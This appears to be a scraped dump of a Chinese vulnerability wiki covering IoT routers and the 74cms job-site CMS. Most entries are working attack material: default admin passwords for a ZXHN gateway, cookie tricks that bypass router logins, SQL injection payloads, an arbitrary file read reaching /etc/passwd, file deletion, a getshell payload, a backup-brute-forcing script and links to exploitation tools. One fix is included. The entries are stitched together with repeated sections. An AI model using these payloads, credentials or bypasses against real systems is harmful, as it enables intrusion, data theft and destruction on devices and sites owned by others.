登录的请求包为 POST /manager/login.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6 Connection: close Name=admin&Pass=admin 保存为文件使用 Sqlmap工具，注入点为 Name参数 sqlmap -r sql-1.txt -p Name --risk 3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:50 "},"IOT安全/电信中兴ZXHN F450A网关/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞.html":{"url":"IOT安全/电信中兴ZXHN F450A网关/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞.html","title":"电信中兴ZXHN F450A网关 默认管理员账号密码漏洞","keywords":"","body":"电信中兴ZXHN F450A网关 默认管理员账号密码漏洞 漏洞描述 电信中兴ZXHN F450A网关 存在默认管理员账号密码 漏洞影响 电信中兴ZXHN F450A网关 FOFA ZXHN F450A 漏洞描述 登录页面如下 [ user/pass useradmin/nE7jA%5m 普通管理员 telecomadmin/nE7jA%5m 超级管理员 [ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:51 "},"IOT安全/磊科NI360路由器/磊科NI360路由器登录绕过漏洞/磊科NI360路由器登录绕过漏洞.html":{"url":"IOT安全/磊科NI360路由器/磊科NI360路由器登录绕过漏洞/磊科NI360路由器登录绕过漏洞.html","title":"磊科NI360路由器登录绕过漏洞","keywords":"","body":"磊科NI360路由器登录绕过漏洞 漏洞描述 磊科NI360路由器存在登录绕过漏洞，通过添加cookie可直接进入后台 漏洞影响 磊科 NI360路由器 FOFA title=\"Netcore\" 漏洞分析 登录页面如下： 通过添加特定的cookie，然后刷新网页即可进入后台。 netcore_login=guest:1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:52 "},"IOT安全/飞鱼星/飞鱼星 家用智能路由 cookie.cgi 权限绕过/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html":{"url":"IOT安全/飞鱼星/飞鱼星 家用智能路由 cookie.cgi 权限绕过/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html","title":"飞鱼星 家用智能路由 cookie.cgi 权限绕过","keywords":"","body":"飞鱼星 家用智能路由 cookie.cgi 权限绕过 漏洞描述 飞鱼星 家用智能路由存在权限绕过，通过Drop特定的请求包访问未授权的管理员页面 漏洞影响 飞鱼星 家用智能路由 漏洞复现 FOFA: title=\"飞鱼星家用智能路由\" 登录页面如下 访问 index.html 时会请求 cookie.cgi http://xxx.xxx.xxx.xxx/index.html 页面抓包 Drop掉 cookie.cgi 跳转后台获取了权限 其中很多产品都存在请求 cookie.cgi，同样的方法可以绕过 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:55 "},"Web安全/74cms/74cms v4.2.1 - v4.2.129-后台getshell漏洞/74cms v4.2.1 - v4.2.129-后台getshell漏洞.html":{"url":"Web安全/74cms/74cms v4.2.1 - v4.2.129-后台getshell漏洞/74cms v4.2.1 - v4.2.129-后台getshell漏洞.html","title":"74cms v4.2.1 - v4.2.129-后台getshell漏洞","keywords":"","body":"74cms v4.2.1-v4.2.129-后台getshell漏洞 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER[\\'HTTP_HOST\\'] 改为 http://baidu.com 即可 0x02漏洞演示 url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' shell:http://74cms.test/Application/Home/Conf/config.php 路径：\\74cms\\upload\\Application\\Home\\Conf\\config.php 0x03 漏洞原理 url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' 路径：74cms\\upload\\Application\\Admin\\Controller\\TplController.class.php 路径： 74cms\\upload\\Application\\Common\\Controller\\BackendController.class.php 0x04题外话-认真版getshell方法 认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/wecilm Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:56 "},"Web安全/74cms/74cms v4.2.126-任意文件读取漏洞/74cms v4.2.126-任意文件读取漏洞.html":{"url":"Web安全/74cms/74cms v4.2.126-任意文件读取漏洞/74cms v4.2.126-任意文件读取漏洞.html","title":"74cms v4.2.126-任意文件读取漏洞","keywords":"","body":"74cms v4.2.126-任意文件读取漏洞 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER[\\'HTTP_HOST\\'] 改为 http://baidu.com 即可 0x02 任意文件读取漏洞演示 url: http://74cms.test/index.php?m=Home&c=Members&a=register post: reg_type=2&utype=2&org=bind&ucenter=bind cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : ) 0x03 漏洞讲解 打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php函数：_save_avatar($avatar, $uid) 如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar 函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二 需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php函数：register() 上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心 这里我们讲解一下如果 post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。 这里写着 当 $data[utype] = 1 会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了 0x04 漏洞利用小工具 https://github.com/ianxtianxt/74cms-upload 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/dr895b Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:59 "},"Web安全/74cms/74cms v4.2.126-前台四处sql注入/74cms v4.2.126-前台四处sql注入.html":{"url":"Web安全/74cms/74cms v4.2.126-前台四处sql注入/74cms v4.2.126-前台四处sql注入.html","title":"74cms v4.2.126-前台四处sql注入","keywords":"","body":"74cms v4.2.126-前台四处sql注入 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER[\\'HTTP_HOST\\'] 改为 http://baidu.com 即可 0x02 概要 这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞 : )这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。ThinkPHP3.2.3框架实现安全数据库操作分析https://www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章，然后在看此文章，会更简单的了解清楚。 0x03 漏洞讲解 非常抱歉，让读者看到前面 3节 不是很有营养的东西。在前面最开始的时候，我说过我有对比源码，使用手册的情况。所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。为了能够更直观，这里开启调试文件：74cms\\upload\\Application\\Common\\Conf\\config.php添加多一行 'SHOW_PAGE_TRACE' => true, 然后打开文件：74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php添加代码： $uid = I('GET.uid'); M('CompanyProfile')->field('companyname,logo')->where(array('uid'=>$uid))->find(); 我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数 I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数 神奇的I函数路径:ThinkPHP\\Common\\functions.php方法名：function I($name,$default=\\'\\',$filter=null,$datas=null) 这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think_filter 函数进行过滤think_filter函数分析 例如： 没有使用think_filter 函数时 goods_name[0]=in&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 使用了think_filter函数时 goods_name[0]=in &goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是 goods_name[0]=in(空格)&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。 接着我们直接打开文件：74cms\\upload\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php think_filter函数与上图两者对比一下，是否发现多点了东西？ 是的没错了。 74cms 修改了tp底层添加了 3个新方法： match match_mode match_with 也就是说这3个方法我们是可以绕过 I 函数的过滤的 接着查看：parseWhereItem( 方法 使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 \"双引号\" 而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件： 74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php 输入url: http://74cms.test/index.php?m=Home&c=index&a=index&uid[0]=match&uid[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()->where($test)->xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后 前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看 : ) 0x04 74cms独有框架漏洞第一处 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php方法：function company_focus($company_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台 注册完成以后登录前台即可如果不登录的话，会显示这个样子url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company\\_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php方法：add_focus( 0x05 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码 image 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 如果不登录的话，会显示这个样子 url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php方法：add_focus( 0x06 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 0x07 74cms独有框架漏洞第三处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php方法：register(是否需登录：不需要 url: http://74cms.test/index.php?m=&c=Members&a=register post: reg_type=2&utype=2&ucenter=bind&unbind_mobile=1 cookie: members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 这里我要大概讲一下参数的问题 post: reg_type=2 // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞 utype=2 // 判断会员类型的也必须为2 为1会直接创建一条数据，导致无法利用漏洞 ucenter=bind // 必须为bind因为要靠他，获取cookie(members_uc_info)并且合并为$data数组进行利用 unbind_mobile=1 // 只要有此字段即可，只是单纯为了满足流程判断的 cookie: members_uc_info[reg_type]=1; // 必须为1 满足流程需要 members_uc_info[utype]=2; // 必须为2 满足流程需要 members_uc_info[mobile][0]=match; // 框架漏洞利用 members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; // 这里输入注入语句 headers: // 伪造ajax操作 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 0x07 74cms独有框架漏洞第四处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 方法：oauth_reg ( 是否需登录：需要 登录权限：普通用户/企业用户都可 url: http://74cms.test/index.php?m=&c=Members&a=oauth_reg post: username = 自己去平台随便注册个账号然后输入那个账号 password = 自己去平台随便注册个账号然后输入那个密码 cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; 看源码 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:02 "},"Web安全/74cms/74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞/74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html":{"url":"Web安全/74cms/74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞/74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html","title":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞","keywords":"","body":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER[\\'HTTP_HOST\\'] 改为 http://baidu.com 即可 0x02 突突突突突突突文件：74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php方法：members_edit( 从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。 先看看数据库现在的数据 接着让我们来调接口看看 文件： 74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php方法：check_token( 接口调用失败的原因是因为，上图的析构函数调用了方法 check_token 进行了token验证 这些都没有问题，$token 也是我们可以操控的。 现在的问题就是C(\\'PWDHASH\\') 我们现在无法得到。 好在，我们还可以通过组合漏洞的形式来获取。 想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C(\\'PWDHASH\\') 的值读取出来，然后在加密验证一下即可 而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。 思路：先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数）然后在通过 \"任意文件读取漏洞\" 读取目标站点的C(\\'PWDHASH\\') 的值，接着本地加密成token这样漏洞就可以使用了 任意文件读取的小脚本下载 https://github.com/ianxtianxt/74cms\\_file\\_read 下载此文件以后 设置成这样，然后执行一下 接着把 PWDHASH 复制出来 我们这里看看加密的代码：文件：74cms\\upload\\Application\\Common\\Common\\function.php函数：encrypt( 然后加密一下 这时你就会发现虽然我们密码改了但是不知道用户名怎么办？ 好在我们可以这样利用！人家登录是可以用户名，手机号登录的，所以我们就 当然如果你要修改用户名登录的话，也可以，看你自己喜欢了 0x03 利用小工具 为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。利用工具: https://github.com/ianxtianxt/74cms\\_file\\_read 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/rymscc Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:09 "},"Web安全/74cms/74cms v4.2.126-通杀sql注入/74cms v4.2.126-通杀sql注入.html":{"url":"Web安全/74cms/74cms v4.2.126-通杀sql注入/74cms v4.2.126-通杀sql注入.html","title":"74cms v4.2.126-通杀sql注入","keywords":"","body":"74cms v4.2.126-通杀sql注入 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html 关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER[\\'HTTP_HOST\\'] 改为 http://baidu.com 即可 0x02 数据填充不然没得测试 0x02.1注册商家账号方便测试 首先先注册一个商家用户然后发布一条消息，注册商家直接去后台注册最简单了注册完成以后将此商家用户登录前台 0x02.2注册普通账号方便测试 0x03 sql漏洞演示 这样的话只要点击完以后有数据 你在 lat lng 字段都可以正常的进行注入 Payload: http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a 0x04 漏洞原理 16.png 说明我们的猜想是没有错的。 所以最终我们符合条件的内容都会赋值为$this->params 0x05 修复方法 $this->field = \"id,ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".floatval($this->params['lat']).\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".floatval($this->params['lat']).\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".floatval($this->params['lng']).\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS map_range\"; 强转为浮点型，防止注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:13 "},"Web安全/74cms/74cms v4.2.3 任意文件删除/74cms v4.2.3 任意文件删除.html":{"url":"Web安全/74cms/74cms v4.2.3 任意文件删除/74cms v4.2.3 任意文件删除.html","title":"74cms v4.2.3 任意文件删除","keywords":"","body":"74cms v4.2.3 任意文件删除 一、漏洞简介 二、漏洞影响 三、复现过程 GET /index.php?m=admin&c=database&a=del&name=/../../../../../ HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/index.php?m=admin&c=database&a=restore Connection: close Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en Upgrade-Insecure-Requests: 1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:58 "},"Web安全/74cms/74cms v4.2.3 任意文件读取/74cms v4.2.3 任意文件读取.html":{"url":"Web安全/74cms/74cms v4.2.3 任意文件读取/74cms v4.2.3 任意文件读取.html","title":"74cms v4.2.3 任意文件读取","keywords":"","body":"74cms v4.2.3任意文件读取 一、漏洞简介 二、漏洞影响 74cms v4.2.3 三、复现过程 先尝试读取 db.php，向服务器post如下数据 POST /index.php?m=&c=members&a=register HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku Content-Type: application/x-www-form-urlencoded ajax=1®_type=2&utype=2&org=bind&ucenter=bind 会返回如下数据 1.png 在/data/upload/avatar/年月/日文件夹下 会生成一张图片 2.png 这张图片的名称由id和时间戳的md5值构成，我们可以将Burp Suite上返回的时间转换为时间戳 3.png 不过这个时间可能会有误差，如果不行就把时间+-10 我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密 4.png 成功获取图片名，然后访问 https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg 保存该图片用文本打开就是 db.php 的内容。 PS: 使用post提交，参数如下 5.png 在Header可获取到时间戳 6.png 可能会遇到的问题 post数据返回unicode编码 因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。 读取其他文件 ../../../../Application/Common/Conf/db.php 是读取db.php，如果想读取根目录可以构造 ../../../../../../../../etc/passwd 时间戳问题 服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:58 "},"Web安全/74cms/74cms v4.2.3 备份文件爆破/74cms v4.2.3 备份文件爆破.html":{"url":"Web安全/74cms/74cms v4.2.3 备份文件爆破/74cms v4.2.3 备份文件爆破.html","title":"74cms v4.2.3 备份文件爆破","keywords":"","body":"74cms v4.2.3 备份文件爆破 一、漏洞简介 二、漏洞影响 三、复现过程 # -*- coding: utf-8 -*- ------------------------------------------------- File Name： 74cms_MysqlBak Description : Author : CoolCat date： 2019/1/5 ------------------------------------------------- Change Activity: 2019/1/5: ------------------------------------------------- \"\"\" __author__ = 'CoolCat' import requests def getBak(time): print(\"[running]:正在查询\" + time + \"是否存在备份\") dir = time + \"_1\" filename = dir + \"_1.sql\" url = target + \"//data/backup/database/\" + dir +\"/\"+ filename session = requests.Session() headers = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0\", \"Connection\": \"close\", \"Accept-Language\": \"en\", \"Accept-Encoding\": \"gzip, deflate\"} cookies = {\"think_language\": \"en\", \"think_template\": \"default\", \"PHPSESSID\": \"6d86a34ec9125b2d08ebbb7630838682\"} response = session.get(url=url, headers=headers, cookies=cookies) if response.status_code == 200: print(url) exit() if __name__ == '__main__': global target target = \"http://www.target.com\" for year in range(2017, 2020): for mouth in range(1, 13): for day in range(1, 31): time = (str(year) + str('%02d' % mouth) + str('%02d' % day)) getBak(time) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:59 "},"Web安全/74cms/74cms v5.0.1前台sql注入/74cms v5.0.1前台sql注入.html":{"url":"Web安全/74cms/74cms v5.0.1前台sql注入/74cms v5.0.1前台sql注入.html","title":"74cms v5.0.1前台sql注入","keywords":"","body":"74cms v5.0.1 前台sql注入 一、漏洞简介 74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入 二、漏洞影响 三、复现过程 具体信息 文件位置：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php 方法：function company_focus($company_id) 是否需登录：需要 登录权限：普通用户即可 Payload: http://0-sec.org/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a 源码分析： 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php company_focus 方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入 跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:16 "},"Web安全/74cms/74cms v5.0.1远程执行代码/74cms v5.0.1远程执行代码.html":{"url":"Web安全/74cms/74cms v5.0.1远程执行代码/74cms v5.0.1远程执行代码.html","title":"74cms v5.0.1远程执行代码","keywords":"","body":"74cms v5.0.1远程执行代码 一、漏洞简介 二、漏洞影响 74cms v5.0.1 三、复现过程 漏洞分析 POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 391 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain=127.0.0.1&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= c=config&a=edit -> Controller=config&action=edit -> /Application/Admin/Controller/ConfigController.class.php Line 9: I(\\'request.site_domain\\',\\'\\',\\'trim\\') -> trim($site_domain,\\'/\\') -> \\'.\\'.implode(\\'.\\',$domain) -> array(\\'domain\\'=>$domain) -> $this->update_config($config,CONF_PATH.\\'url.php\\') public function edit(){ if(IS_POST){ $site_domain = I('request.site_domain','','trim'); $site_domain = trim($site_domain,'/'); $site_dir = I('request.site_dir',C('qscms_site_dir'),'trim'); $site_dir = $site_dir==''?'/':$site_dir; $site_dir = $site_dir=='/'?$site_dir:('/'.trim($site_dir,'/').'/'); $_POST['site_dir'] = $site_dir; if($site_domain && $site_domain != C('qscms_site_domain')){ 